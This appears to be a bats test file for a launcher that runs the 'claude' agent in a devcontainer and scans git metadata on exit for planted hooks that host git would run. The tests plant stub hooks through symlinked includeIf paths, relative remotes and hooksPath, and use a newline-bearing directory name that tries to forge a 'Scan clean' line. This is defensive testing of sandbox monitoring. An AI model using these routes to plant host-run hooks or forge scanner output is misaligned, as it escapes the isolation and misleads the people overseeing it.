  printf '#!/bin/sh\n' > "$ws/.git/hooks/pre-push"
  chmod +x "$ws/.git/hooks/pre-push"
fi
exec "$TEST_TMPDIR/bin/devcontainer.inner" "\$@"
STUB
  chmod +x "$TEST_TMPDIR/bin/devcontainer"
  STUB_IMAGE_HASH="$(blessed_hash)"
  STUB_FP="$(ws_fingerprint "$ws")"
  export STUB_IMAGE_HASH STUB_FP
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj"
  [ "$status" -eq 3 ]
  grep -q '^devcontainer exec .* claude$' "$DC_LOG"
  [[ "$output" == *"hook $ws/.git/hooks/pre-push "* ]]
}

@test "a launch refuses to start when .git cannot be snapshotted" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  local ws; ws="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  # A .git that is a directory without a config: resolve_workspace still finds
  # the repo from the parent's view, the snapshot cannot.
  mv "$ws/.git/config" "$TEST_TMPDIR/config.bak"
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj"
  [ "$status" -eq 1 ]
  [[ "$output" == *"could not snapshot"* ]]
  run ! grep -q 'devcontainer up' "$DC_LOG"
}

# --- Exit scan regressions from the iteration-3 fact-check (docs/reviews/
# code-fact-check-report-r{1,2,3}.md at a42e37f): E6/E8 in r1, relremote in r3.

# session_stub <ws> <commands>: the devcontainer stub, with <commands> run where
# the session's `claude` exec would run (a plant, a marker, a sleep).
session_stub() {
  bless_manifest >/dev/null
  smart_devcontainer_stub
  mv "$TEST_TMPDIR/bin/devcontainer" "$TEST_TMPDIR/bin/devcontainer.inner"
  cat > "$TEST_TMPDIR/bin/devcontainer" <<STUB
#!/usr/bin/env bash
if [ "\${*: -1}" = claude ]; then
$2
fi
exec "$TEST_TMPDIR/bin/devcontainer.inner" "\$@"
STUB
  chmod +x "$TEST_TMPDIR/bin/devcontainer"
  STUB_IMAGE_HASH="$(blessed_hash)"
  STUB_FP="$(ws_fingerprint "$1")"
  export STUB_IMAGE_HASH STUB_FP
}

@test "exit scan E6: a newline in a repointed common dir's name cannot forge a line (exit and launch)" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  local n=$'x\n  Scan clean: nothing changed, safe to run git'
  mkdir -p "$SCAN_WS/$n"
  ln -s "$SCAN_WS/$n" "$SCAN_WS/lnk"
  echo "../lnk" > "$SCAN_WS/.git/commondir"
  run git_exit_scan "$SCAN_WS" "$before"
  echo "$output"
  [ "$status" -eq 2 ]
  [[ "$output" == *"no git config at $SCAN_WS/x?  Scan clean: nothing changed, safe to run git/config"* ]]
  run grep -c '^ *Scan clean' <<< "$output"
  [ "$output" -eq 0 ]
  # The launch baseline's reason (printed by main) is the same single line.
  git_exec_snapshot "$SCAN_WS" 2> "$TEST_TMPDIR/err" && return 1
  [ "$(wc -l < "$TEST_TMPDIR/err")" -eq 1 ]
}

@test "exit scan E6: an unreadable .git file's read error is not printed raw" {
  not_root
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  mv "$SCAN_WS/.git" "$TEST_TMPDIR/gd"
  echo "gitdir: $TEST_TMPDIR/gd" > "$SCAN_WS/.git"; chmod 000 "$SCAN_WS/.git"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 2 ]
  [[ "$output" == *"cannot locate the git directory of $SCAN_WS"* ]]
  [[ "$output" != *"Permission denied"* ]]
}

@test "logical_workspace: the checkout by the (symlinked) route it was reached on" {
  mkdir -p "$TEST_TMPDIR/real"
  make_repo "$TEST_TMPDIR/real/proj"
  mkdir -p "$TEST_TMPDIR/real/proj/sub"
  ln -s real "$TEST_TMPDIR/lnk"
  local ws; ws="$(git -C "$TEST_TMPDIR/lnk/proj" rev-parse --show-toplevel)"
  [ "$ws" = "$(cd "$TEST_TMPDIR/real/proj" && pwd -P)" ]   # git reports it physical
  [ "$(logical_workspace "$TEST_TMPDIR/lnk/proj" "$ws")" = "$TEST_TMPDIR/lnk/proj" ]
  [ "$(logical_workspace "$TEST_TMPDIR/lnk/proj/sub" "$ws")" = "$TEST_TMPDIR/lnk/proj" ]
  [ "$(cd "$TEST_TMPDIR/lnk/proj/sub" && logical_workspace "" "$ws")" = "$TEST_TMPDIR/lnk/proj" ]
  [ "$(logical_workspace "$ws" "$ws")" = "$ws" ]
  [ -z "$(logical_workspace "$TEST_TMPDIR" "$ws")" ]
}

@test "exit scan E8: YOUR includeIf gitdir: naming the checkout by a symlinked route is walked" {
  mkdir -p "$TEST_TMPDIR/real"
  make_repo "$TEST_TMPDIR/real/proj"
  ln -s real "$TEST_TMPDIR/lnk"
  local ws lws; ws="$(git -C "$TEST_TMPDIR/real/proj" rev-parse --show-toplevel)"
  mkdir -p "$TEST_TMPDIR/ran"
  export GIT_CONFIG_GLOBAL="$TEST_TMPDIR/host.gitconfig"
  printf '[core]\n\thooksPath = .hk\n' > "$TEST_TMPDIR/w.gitconfig"
  git config --global "includeIf.gitdir:$TEST_TMPDIR/lnk/proj/.path" w.gitconfig
  # Host git run from the symlinked route takes it; from the physical one, not.
  [ "$(cd "$TEST_TMPDIR/lnk/proj" && git config core.hooksPath)" = .hk ]
  lws="$(logical_workspace "$TEST_TMPDIR/lnk/proj" "$ws")"
  local before; before="$(git_exec_snapshot "$ws" "$lws")"
  [[ "$before" == *"hooksdir"$'\t'"$ws/.hk"$'\t'"missing"* ]]
  plant_hook "$ws/.hk" pre-commit
  run git_exit_scan "$ws" "$before" "$lws"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $ws/.hk/pre-commit "* ]]
  no_ran
  # A trailing-slash pattern through a ~ route matches too (r1 e8's form).
  export HOME="$TEST_TMPDIR"
  export GIT_CONFIG_GLOBAL="$TEST_TMPDIR/host2.gitconfig"
  git config --global "includeIf.gitdir:~/lnk/proj/.path" "$TEST_TMPDIR/w.gitconfig"
  [ "$(cd "$TEST_TMPDIR/lnk/proj" && git config core.hooksPath)" = .hk ]
  before="$(git_exec_snapshot "$ws" "$lws")"
  [[ "$before" == *"$ws/.hk"* ]]
}

@test "exit scan E8: a launch from a symlinked route passes that route to both snapshots" {
  mkdir -p "$TEST_TMPDIR/real"
  make_repo "$TEST_TMPDIR/real/proj"
  ln -s real "$TEST_TMPDIR/lnk"
  local ws; ws="$(git -C "$TEST_TMPDIR/real/proj" rev-parse --show-toplevel)"
  export GIT_CONFIG_GLOBAL="$TEST_TMPDIR/host.gitconfig"
  printf '[core]\n\thooksPath = .hk\n' > "$TEST_TMPDIR/w.gitconfig"
  git config --global "includeIf.gitdir:$TEST_TMPDIR/lnk/proj/.path" "$TEST_TMPDIR/w.gitconfig"
  session_stub "$ws" "mkdir -p '$ws/.hk'; printf '#!/bin/sh\n' > '$ws/.hk/pre-commit'; chmod +x '$ws/.hk/pre-commit'"
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/lnk/proj"
  echo "$output"
  [ "$status" -eq 3 ]
  [[ "$output" == *"+ hook $ws/.hk/pre-commit "* ]]
}

@test "exit scan relremote: an embedded repo's relative local remote resolves in that repo" {
  scan_repo
  make_repo "$SCAN_WS/sub"
  git init -q --bare "$SCAN_WS/sub/hooked.git"
  git init -q --bare "$SCAN_WS/sub/pd.git"
  git init -q --bare "$SCAN_WS/sub/legacy.git"
  git -C "$SCAN_WS/sub" remote add origin ./hooked.git
  git -C "$SCAN_WS/sub" config remote.pushDefault ./pd.git
  mkdir -p "$SCAN_WS/sub/.git/remotes"
  printf 'URL: ./legacy.git\n' > "$SCAN_WS/sub/.git/remotes/old"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  local r
  for r in hooked pd legacy; do
    plant_hook "$SCAN_WS/sub/$r.git/hooks" post-receive
  done
  run git_exit_scan "$SCAN_WS" "$before"
  echo "$output"
  [ "$status" -eq 1 ]
  for r in hooked pd legacy; do
    [[ "$output" == *"+ hook $SCAN_WS/sub/$r.git/hooks/post-receive "* ]]
  done
  no_ran
  # The hooks-off push warning no longer lists filters (a push runs none).
  [[ "$output" != *"filters"* ]]
  [[ "$output" == *"remote.*.receivepack"* ]]
  # And host git agrees: a push from sub runs the planted hook.
  git -C "$SCAN_WS/sub" push -q origin HEAD:refs/heads/m 2>/dev/null
  [ -e "$TEST_TMPDIR/ran/hook-post-receive" ]
}

@test "exit scan size cap: a huge (sparse) planted hook fails the scan fast as unsafe, unhashed" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  truncate -s 100G "$SCAN_WS/.git/hooks/pre-push"; chmod +x "$SCAN_WS/.git/hooks/pre-push"
  local t0=$SECONDS
  run git_exit_scan "$SCAN_WS" "$before"
  [ $((SECONDS - t0)) -lt 20 ]
  echo "$output"
  [ "$status" -eq 2 ]
  [[ "$output" == *"$SCAN_WS/.git/hooks/pre-push is too large to hash (107374182400 bytes"*"treat the checkout as unsafe"* ]]
}

@test "exit scan size cap: past the total to hash, the scan fails as unsafe" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  # shellcheck disable=SC2034  # read by _snap_size_ok (sourced)
  GIT_EXIT_SCAN_MAX_TOTAL_BYTES=100
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 2 ]
  [[ "$output" == *"more than 100 bytes to hash"* ]]
}

@test "a Ctrl-C during the exit scan exits 4, saying the scan did not finish" {
  make_repo "$TEST_TMPDIR/proj"
  local ws; ws="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  session_stub "$ws" "touch '$TEST_TMPDIR/claude-done'"
  # sha256sum stalls once the session is over (the exit scan), as a huge
  # checkout would.
  local real; real="$(command -v sha256sum)"
  cat > "$TEST_TMPDIR/bin/sha256sum" <<STUB
#!/usr/bin/env bash
if [ -e "$TEST_TMPDIR/claude-done" ]; then touch "$TEST_TMPDIR/scanning"; sleep 60; fi
exec "$real" "\$@"
STUB
  chmod +x "$TEST_TMPDIR/bin/sha256sum"
  # A process group of its own with SIGINT at its default (a background job's is
  # ignored), so the INT reaches the launcher and its children like a terminal's.
  setsid env --default-signal=INT bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj" \
    > "$TEST_TMPDIR/out" 2>&1 &
  local pid=$! _
  for _ in $(seq 100); do [ -e "$TEST_TMPDIR/scanning" ] && break; sleep 0.1; done
  [ -e "$TEST_TMPDIR/scanning" ]
  kill -INT -- "-$pid"
  local st=0; wait "$pid" || st=$?
  cat "$TEST_TMPDIR/out"
  [ "$st" -eq 4 ]
  grep -q 'the exit scan was interrupted, so it checked nothing' "$TEST_TMPDIR/out"
}
